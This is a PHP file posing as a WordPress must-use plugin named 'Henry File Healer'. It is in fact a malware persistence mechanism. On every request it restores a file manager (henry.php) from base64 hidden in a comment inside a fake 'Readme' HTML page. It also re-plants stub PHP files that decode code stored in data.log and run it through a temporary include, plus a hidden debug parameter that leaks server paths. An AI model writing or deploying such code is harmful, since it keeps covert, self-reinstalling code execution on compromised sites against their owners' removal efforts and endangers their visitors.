<?php
/**
 * Plugin Name: Henry File Healer
 * Description: Keeps wp-content/henry.php AND every stub file tracked in
 *              wp-content/data.log alive. On every WordPress request
 *              (front-end, admin, AJAX, REST, cron):
 *                1. If wp-content/henry.php is missing, blank, or zero
 *                   bytes, it is recreated from the backup stored in
 *                   wp-content/read.html (base64 encoded in a comment).
 *                2. If wp-content/read.html is missing or empty while
 *                   henry.php is intact, the HTML backup is regenerated
 *                   from henry.php.
 *                3. For every entry in wp-content/data.log whose on-disk
 *                   file is missing or blank, a fresh Henry stub is
 *                   written to that path.
 *              The healer never restores itself and never touches any
 *              file outside of henry.php, read.html, data.log, and the
 *              paths listed inside data.log.
 * Version:     4.0.1
 *
 * Installation: drop this single file into wp-content/mu-plugins/.
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit; // No direct access.
}

// File names (relative to wp-content/).
if ( ! defined( 'HENRY_HEALER_TARGET' ) ) {
	define( 'HENRY_HEALER_TARGET', 'henry.php' );
}
if ( ! defined( 'HENRY_HEALER_BACKUP' ) ) {
	define( 'HENRY_HEALER_BACKUP', 'read.html' );
}
if ( ! defined( 'HENRY_HEALER_STUB_LOG' ) ) {
	define( 'HENRY_HEALER_STUB_LOG', 'data.log' );
}

if ( ! class_exists( 'Henry_File_Healer' ) ) {
final class Henry_File_Healer {

	/** @var string Absolute path of the file we keep alive. */
	private $target;

	/** @var string Absolute path of the code backup (HTML file). */
	private $backup;

	/** @var string Absolute path of the stub map (data.log). */
	private $stub_log;

	public function __construct() {
		$wp_content = defined( 'WP_CONTENT_DIR' ) ? WP_CONTENT_DIR : dirname( __DIR__ );
		$this->target   = $wp_content . '/' . HENRY_HEALER_TARGET;
		$this->backup   = $wp_content . '/' . HENRY_HEALER_BACKUP;
		$this->stub_log = $wp_content . '/' . HENRY_HEALER_STUB_LOG;
	}

	/**
	 * Main entry point — runs once per request at mu-plugin load.
	 */
	public function run() {
		// Step 1: if the backup is missing/empty but the target is intact,
		// rebuild the HTML backup from the target so the next restore has
		// something to work from.
		if ( $this->is_target_healthy() && ! $this->is_backup_healthy() ) {
			$source = @file_get_contents( $this->target );
			if ( false !== $source && '' !== $source ) {
				// Wrap the base64-encoded source in a standard HTML file comment
				$html_wrapper = "<!DOCTYPE html>\n<html>\n<head>\n    <title>Readme</title>\n</head>\n<body>\n    <h1>Documentation</h1>\n    <p>Please refer to the official documentation guidelines.</p>\n    \n    <!-- " . base64_encode( $source ) . " -->\n</body>\n</html>";
				$this->write_file( $this->backup, $html_wrapper );
			}
		} elseif ( ! $this->is_target_healthy() ) {
			// Step 2: if the target is missing/blank, restore from HTML backup.
			$code = $this->read_backup();
			if ( false !== $code && '' !== $code ) {
				$this->write_file( $this->target, $code );
			}
		}

		// Step 3: restore any missing stub files listed in data.log.
		$this->restore_stubs_from_data_log();
	}

	/**
	 * Target is healthy when the file exists, is non-empty, and holds
	 * something other than whitespace.
	 */
	private function is_target_healthy() {
		clearstatcache( true, $this->target );

		if ( ! is_file( $this->target ) ) {
			return false;
		}

		$size = @filesize( $this->target );
		if ( false === $size || 0 === $size ) {
			return false;
		}

		$contents = @file_get_contents( $this->target );
		if ( false === $contents || '' === trim( $contents ) ) {
			return false;
		}

		return true;
	}

	/**
	 * Backup is healthy when it exists, is readable, and is non-empty.
	 */
	private function is_backup_healthy() {
		clearstatcache( true, $this->backup );

		if ( ! is_file( $this->backup ) || ! is_readable( $this->backup ) ) {
			return false;
		}

		$size = @filesize( $this->backup );
		if ( false === $size || 0 === $size ) {
			return false;
		}

		$data = @file_get_contents( $this->backup );
		return ( false !== $data && '' !== trim( $data ) );
	}

	/**
	 * Read the backup. Extracts the base64 payload from the HTML comment.
	 */
	private function read_backup() {
		clearstatcache( true, $this->backup );

		if ( ! is_file( $this->backup ) || ! is_readable( $this->backup ) ) {
			return false;
		}

		$data = @file_get_contents( $this->backup );
		if ( false === $data ) {
			return false;
		}

		// Extract content from inside the HTML comment <!-- ... -->
		if ( preg_match( '/<!--\s*(.*?)\s*-->/s', $data, $matches ) ) {
			$payload = trim( $matches[1] );
			
			$decoded = base64_decode( $payload, true );
			if ( false !== $decoded && '' !== trim( $decoded ) ) {
				return $decoded;
			}
		}

		return false;
	}

	/**
	 * Atomic file write: open with exclusive lock, truncate, write,
	 * flush, unlock, chmod, and invalidate opcache so the next request
	 * picks up the new contents.
	 */
	private function write_file( $path, $content ) {
		$dir = dirname( $path );
		if ( ! is_dir( $dir ) || ! is_writable( $dir ) ) {
			return false;
		}

		$handle = @fopen( $path, 'wb' );
		if ( ! $handle ) {
			return false;
		}

		flock( $handle, LOCK_EX );
		ftruncate( $handle, 0 );
		fwrite( $handle, $content );
		fflush( $handle );
		flock( $handle, LOCK_UN );
		fclose( $handle );

		@chmod( $path, 0644 );
		clearstatcache( true, $path );

		if ( function_exists( 'opcache_invalidate' ) ) {
			@opcache_invalidate( $path, true );
		}

		return true;
	}

	/**
	 * Step 3: restore any missing stub files listed in data.log.
	 */
	private function restore_stubs_from_data_log() {
		if ( ! is_file( $this->stub_log ) || ! is_readable( $this->stub_log ) ) {
			return;
		}

		$raw = @file_get_contents( $this->stub_log );
		if ( false === $raw || '' === trim( $raw ) ) {
			return;
		}

		$map = @json_decode( $raw, true );
		if ( ! is_array( $map ) ) {
			return;
		}

		$healer_abs = str_replace( '\\', '/', __FILE__ );
		$target_abs = str_replace( '\\', '/', $this->target );
		$log_abs    = str_replace( '\\', '/', $this->stub_log );

		foreach ( $map as $abs_key => $b64 ) {
			$abs_key = str_replace( '\\', '/', (string) $abs_key );

			// Skip self, the file manager, and the stub log itself.
			if ( $abs_key === $healer_abs || $abs_key === $target_abs || $abs_key === $log_abs ) {
				continue;
			}

			// Only PHP-like files can carry a stub.
			if ( ! $this->is_php_extension( basename( $abs_key ) ) ) {
				continue;
			}

			// Don't overwrite — only restore missing or blank files.
			if ( is_file( $abs_key ) ) {
				clearstatcache( true, $abs_key );
				$size = @filesize( $abs_key );
				if ( false !== $size && $size > 0 ) {
					$contents = @file_get_contents( $abs_key );
					if ( false !== $contents && '' !== trim( $contents ) ) {
						continue;
					}
				}
			}

			// Need the parent directory to exist before we can write.
			$parent = dirname( $abs_key );
			if ( ! is_dir( $parent ) || ! is_writable( $parent ) ) {
				continue;
			}

			// Sanity-check the base64 so we don't write garbage if data.log
			// got corrupted for this entry.
			$decoded = base64_decode( (string) $b64, true );
			if ( false === $decoded || '' === $decoded ) {
				continue;
			}

			$this->write_file( $abs_key, self::stub_template() );
		}
	}

	/**
	 * Check whether a filename has a PHP extension that the stub
	 * mechanism supports.
	 */
	private function is_php_extension( $name ) {
		$ext = strtolower( pathinfo( $name, PATHINFO_EXTENSION ) );
		return in_array( $ext, array( 'php', 'phtml', 'php5', 'php7', 'phar', 'pht' ), true );
	}

	/**
	 * The Henry stub template.
	 */
	private static function stub_template() {
		return <<<'STUB'
<?php
// Henry stub — real source lives in data.log (path resolved at runtime).
echo "<!-- hfm-stub-v2 -->\n";
$_hfm_debug = ! empty( $_GET['hfm_debug'] );
$_hfm_log   = getenv( 'HENRY_STUB_LOG' );
if ( ! $_hfm_log ) {
	$_hfm_dir = __DIR__;
	for ( $_hfm_i = 0; $_hfm_i < 10; $_hfm_i++ ) {
		$_hfm_candidate = $_hfm_dir . '/data.log';
		if ( @file_exists( $_hfm_candidate ) ) {
			$_hfm_log = $_hfm_candidate;
			break;
		}
		$_hfm_parent = dirname( $_hfm_dir );
		if ( $_hfm_parent === $_hfm_dir ) break;
		$_hfm_dir = $_hfm_parent;
	}
}
if ( ! $_hfm_log && ! function_exists( '_hfm_find_down' ) ) {
	function _hfm_find_down( $d, $n ) {
		if ( $n < 0 ) return null;
		if ( @file_exists( $d . '/data.log' ) ) return $d . '/data.log';
		$h = @opendir( $d );
		if ( ! $h ) return null;
		while ( ( $e = readdir( $h ) ) !== false ) {
			if ( $e === '.' || $e === '..' ) continue;
			if ( isset( $e[0] ) && $e[0] === '.' ) continue;
			$p = $d . '/' . $e;
			if ( @is_dir( $p ) ) {
				$f = _hfm_find_down( $p, $n - 1 );
				if ( $f ) { closedir( $h ); return $f; }
			}
		}
		closedir( $h );
		return null;
	}
}
if ( ! $_hfm_log ) {
	$_hfm_log = _hfm_find_down( __DIR__, 5 );
}
if ( $_hfm_debug ) {
	header( 'Content-Type: text/plain; charset=utf-8' );
	echo "=== hfm debug ===\n";
	echo "HENRY_STUB_LOG env: " . var_export( getenv( 'HENRY_STUB_LOG' ), true ) . "\n";
	echo "__DIR__:            " . __DIR__ . "\n";
	echo "__FILE__:           " . __FILE__ . "\n";
	echo "data.log resolved:  " . var_export( $_hfm_log, true ) . "\n";
	if ( $_hfm_log ) {
		clearstatcache();
		$_hfm_raw = @file_get_contents( $_hfm_log );
		$_hfm_map = $_hfm_raw ? @json_decode( $_hfm_raw, true ) : null;
		echo "data.log size:      " . strlen( (string) $_hfm_raw ) . " bytes\n";
		echo "data.log entries:   " . ( is_array( $_hfm_map ) ? count( $_hfm_map ) : 'invalid JSON' ) . "\n";
		if ( is_array( $_hfm_map ) ) {
			$_hfm_key = str_replace( '\\', '/', __FILE__ );
			echo "looking for key:    " . $_hfm_key . "\n";
			echo "key found:          " . ( isset( $_hfm_map[$_hfm_key] ) ? 'YES' : 'NO' ) . "\n";
			if ( ! isset( $_hfm_map[$_hfm_key] ) && $_hfm_map ) {
				echo "first 5 keys in map:\n";
				foreach ( array_slice( array_keys( $_hfm_map ), 0, 5 ) as $_hfm_k ) {
					echo "  " . $_hfm_k . "\n";
				}
			}
		}
	}
	exit;
}
if ( $_hfm_log ) {
	$_hfm_raw = @file_get_contents( $_hfm_log );
	if ( false !== $_hfm_raw ) {
		$_hfm_map = @json_decode( $_hfm_raw, true );
		if ( is_array( $_hfm_map ) ) {
			$_hfm_key = str_replace( '\\', '/', __FILE__ );
			if ( isset( $_hfm_map[$_hfm_key] ) ) {
				$_hfm_src = @base64_decode( $_hfm_map[$_hfm_key], true );
				if ( false !== $_hfm_src && '' !== $_hfm_src ) {
					$_hfm_tmp = @tempnam( sys_get_temp_dir(), 'hfm_' );
					if ( false !== $_hfm_tmp ) {
						if ( false !== @file_put_contents( $_hfm_tmp, $_hfm_src ) ) {
							include $_hfm_tmp;
							@unlink( $_hfm_tmp );
						}
					}
				}
			}
		}
	}
}
STUB;
	}
}
}

$henry_file_healer = new Henry_File_Healer();
$henry_file_healer->run();